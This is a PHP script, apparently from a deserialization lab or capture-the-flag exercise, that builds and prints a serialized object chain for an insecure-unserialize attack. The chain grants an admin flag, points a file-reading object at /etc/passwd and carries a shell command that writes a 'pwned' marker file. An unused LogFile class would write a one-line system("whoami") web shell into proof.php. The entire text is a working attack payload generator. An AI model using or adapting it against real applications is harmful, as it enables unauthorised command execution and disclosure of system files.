<?php

class User
{
    public function __construct()
    {
        $this->username = new ReadFile();
        $this->isAdmin = True;
    }
}

class ReadFile
{
    public function __construct()
    {
       $this->filename = "/etc/passwd"; 
       $this->pwnobj = new Pwned();
    }

}

class LogFile
{
    public function __construct()
    {
        $this->filename = './proof.php';
        $this->username = '<?php system("whoami"); ?>';
    }
}

class Pwned
{
    public function __construct()
    {
        $this->command = 'echo you have been pwned > ./pwn.txt';
    }
}

$user = new User();
echo serialize($user) . "\n";

?>
